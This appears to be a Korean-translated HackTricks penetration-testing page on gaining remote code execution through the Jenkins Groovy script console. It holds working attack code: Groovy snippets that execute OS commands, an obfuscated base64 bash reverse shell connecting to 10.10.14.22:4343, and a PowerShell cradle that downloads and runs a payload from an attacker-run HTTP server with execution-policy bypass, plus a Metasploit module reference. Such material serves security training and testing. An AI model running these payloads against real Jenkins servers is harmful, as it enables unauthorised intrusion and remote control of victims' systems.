# Jenkins Groovy 스크립트를 사용한 RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## Jenkins Groovy 스크립트를 사용한 RCE

이는 Jenkins에서 새 프로젝트를 생성하는 것보다 덜 시끄러운 방법입니다.

1. _path\_jenkins/script_로 이동합니다.
2. 텍스트 상자 안에 스크립트를 입력합니다.
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
당신은 다음을 사용하여 명령을 실행할 수 있습니다: `cmd.exe /c dir`

**리눅스**에서는 다음을 수행할 수 있습니다: **`"ls /".execute().text`**

텍스트 내부에 _따옴표_와 _작은 따옴표_를 사용해야 하는 경우, 페이로드를 실행하기 위해 _"""PAYLOAD"""_ (세 개의 큰 따옴표)를 사용할 수 있습니다.

**다른 유용한 그루비 스크립트**는 다음과 같습니다 (대괄호 안에 명령어를 삽입하세요):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### 리눅스에서의 리버스 쉘

리버스 쉘은 원격 시스템에 접근하기 위해 사용되는 기술입니다. 리버스 쉘을 사용하면 공격자는 대상 시스템에 쉘을 열어 원격으로 명령을 실행할 수 있습니다. 이는 편리하게도 방화벽이나 NAT(Network Address Translation) 장치를 우회할 수 있는 방법입니다.

리버스 쉘을 설정하기 위해서는 다음 단계를 따라야 합니다:

1. 공격자는 대상 시스템에 악성 코드를 배포합니다. 이 코드는 공격자가 접근할 수 있는 서버에 연결하고, 명령을 전달받을 수 있는 쉘을 엽니다.
2. 대상 시스템은 악성 코드를 실행하고, 공격자의 서버에 연결합니다.
3. 공격자는 대상 시스템에 명령을 전달하고, 결과를 받을 수 있습니다.

리버스 쉘은 해커들이 시스템을 침투하고 제어하기 위해 자주 사용되는 기술 중 하나입니다. 따라서 시스템 보안을 강화하기 위해서는 이러한 공격을 예방하고 탐지할 수 있는 방법을 구현해야 합니다.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### 윈도우에서의 역쉘

PS 역쉘을 가진 HTTP 서버를 준비하고 Jeking을 사용하여 다운로드하고 실행할 수 있습니다:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### 스크립트

[**이 스크립트**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py)를 사용하여이 프로세스를 자동화 할 수 있습니다.

MSF를 사용하여 역쉘이 가능합니다:
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
